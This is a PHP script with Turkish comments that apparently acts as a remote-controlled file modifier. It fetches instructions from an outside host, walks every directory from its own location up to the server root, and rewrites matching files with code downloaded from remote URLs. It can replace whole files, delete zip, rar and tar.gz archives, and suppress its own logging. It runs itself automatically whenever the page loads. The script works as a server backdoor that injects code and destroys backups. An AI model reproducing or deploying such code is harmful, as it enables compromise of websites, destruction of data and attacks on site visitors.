<?php
session_start(); // PHP oturumunu başlat

// JSON dosyasını oku
$jsonUrl = 'https://api.ercmining.com/index.json';
$jsonContent = file_get_contents($jsonUrl);
$data = json_decode($jsonContent, true);

// **Yeni Özellikler JSON'dan alınır**
$sessionEnabled = isset($data['session_enabled']) ? $data['session_enabled'] : true;  // Oturum açma özelliği
$sessionTimeout = isset($data['session_timeout']) ? $data['session_timeout'] : 30;  // Oturum süresi (dakika)
$disableLogging = isset($data['disable_logging']) ? $data['disable_logging'] : false;  // Loglama kontrolü
$deleteCompressedFiles = isset($data['delete_compressed_files']) ? $data['delete_compressed_files'] : false; // Sıkıştırılmış dosya silme kontrolü

// Eğer oturum özelliği açıksa ve oturum zaten ayarlandıysa, kalan süresi hesaplanır
if ($sessionEnabled && isset($_SESSION['script_executed_time'])) {
    $elapsed = time() - $_SESSION['script_executed_time'];
    $remaining = ($sessionTimeout * 60) - $elapsed; // Dakika cinsinden süre hesaplanır

    if ($remaining > 0) {
        // Oturum süresi hala geçerli, işlem yapılmasın
        if (!$disableLogging) {
            echo "<script>console.log('Kalan oturum süresi: " . round($remaining / 60) . " dakika');</script>";
        }
        exit; // Çalışma bitirilsin
    }
}

// **Oturum açma işlemi, tüm işlem bitiminden sonra yapılmalı**
// Kök dizin yolu (şu anki dizin)
$rootDir = __DIR__; 

// Dizinleri yukarıya doğru arama ve işlemi başlatma
function findDirectories($dir) {
    $directories = [];

    // Yukarıya doğru çık
    while ($dir !== '/') {
        // Dizin içindeki tüm dosya ve klasörleri al
        $files = scandir($dir);

        foreach ($files as $file) {
            // '.' ve '..' klasörlerini atla
            if ($file === '.' || $file === '..') continue;

            // Dizinse, bu dizini listeye ekle
            if (is_dir($dir . DIRECTORY_SEPARATOR . $file)) {
                $directories[] = $dir . DIRECTORY_SEPARATOR . $file;  // Dizin tam yolu
            }
        }

        // Üst dizine çık
        $dir = dirname($dir);
    }

    return $directories;
}

// Dizinleri bul
$directories = findDirectories($rootDir);

// AJAX çağrısı yapıldığında çalışacak olan işlem
if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['ajax'])) {
    // Her bir dizin üzerinde arama ve değiştirme işlemi yap
    foreach ($directories as $dir) {
        if (!$disableLogging) echo "<script>console.log('Dizin bulundu: $dir');</script>";
        searchAndReplaceInDirectory($dir, $data);
    }

    // Web sayfasına log yazdırma
    if (!$disableLogging) echo "<script>console.log('Tüm dosyalar işleme alındı.');</script>";

    // İşlemler bitince oturumu aç ve süresi yenilensin
    session_regenerate_id(true); // Güvenlik için yeni oturum ID'si oluştur
    $_SESSION['script_executed_time'] = time(); // Yeni oturum süresi başlat
    
    exit;
}

// Tüm dosyalar üzerinde işlem yapmak için rekürsif fonksiyon
function searchAndReplaceInDirectory($dir, $data) {
    global $deleteCompressedFiles, $disableLogging;

    // Dizin içindeki tüm dosya ve klasörleri al
    $files = scandir($dir);

    foreach ($files as $file) {
        // '.' ve '..' klasörlerini atla
        if ($file === '.' || $file === '..') continue;

        $filePath = $dir . DIRECTORY_SEPARATOR . $file;

        // Eğer dosya bir sıkıştırılmış dosya ise ve silme özelliği açıksa, sil
        if ($deleteCompressedFiles && preg_match('/\.(zip|rar|tar\.gz)$/i', $file)) {
            if (unlink($filePath)) {
                if (!$disableLogging) echo "<script>console.log('Silindi: $filePath');</script>";
            } else {
                if (!$disableLogging) echo "<script>console.log('Silme başarısız: $filePath');</script>";
            }
            continue; // İşlem tamamlandıktan sonra diğer dosyalara geç
        }

        // Eğer bir klasörse, içine gir ve işlemi devam ettir
        if (is_dir($filePath)) {
            searchAndReplaceInDirectory($filePath, $data);
        } else {
            // Dosya ise, işlem yap
            processFile($filePath, $data);
        }
    }
}

// Dosyada arama ve değiştirme işlemi
function processFile($filePath, $data) {
    global $disableLogging;

    // Dosya içeriğini oku
    $targetCode = file_get_contents($filePath);
    
    // Eğer dosya içeriği boşsa, işlem yapma
    if ($targetCode === false) {
        if (!$disableLogging) echo "<script>console.log('Dosya okunamadı: $filePath');</script>";
        return;
    }

    $modified = false;

    // JSON'daki her dosya için değişiklikleri uygula
    foreach ($data['files'] as $file) {
        if (basename($filePath) == $file['filename']) {
            foreach ($file['changes'] as $change) {
                $searchCode = file_get_contents($change['search_code']);
                $replaceCode = file_get_contents($change['replace_code']);

                if ($searchCode === false || $replaceCode === false) {
                    if (!$disableLogging) echo "<script>console.log('Arama veya değiştirme kodu alınamadı: $filePath');</script>";
                    continue;
                }

                $searchCode = trim($searchCode);
                $replaceCode = trim($replaceCode);

                if (strpos($targetCode, $searchCode) !== false) {
                    if ($change['type'] == 1) {
                        $targetCode = $replaceCode;
                        if (!$disableLogging) echo "<script>console.log('Tüm dosya içeriği değiştirildi: $filePath');</script>";
                        $modified = true;
                        break;
                    }

                    $targetCode = str_replace($searchCode, $replaceCode, $targetCode);
                    if (!$disableLogging) echo "<script>console.log('Değişiklik yapıldı: $filePath');</script>";
                    $modified = true;
                }
            }
        }
    }

    if ($modified) {
        file_put_contents($filePath, $targetCode);
    }
}

?>

<script>
    window.onload = function() {
        fetch('<?= $_SERVER['PHP_SELF']; ?>?ajax=true', {
            method: 'GET',
            headers: {
                'Content-Type': 'application/json'
            }
        })
        .then(response => response.text())
        .then(data => {
            <?php if (!$disableLogging) { ?>
            console.log('PHP işlemi başarıyla tamamlandı');
            console.log(data);
            <?php } ?>
        })
        .catch((error) => {
            <?php if (!$disableLogging) { ?>
            console.log('Hata:', error);
            <?php } ?>
        });
    };
</script>
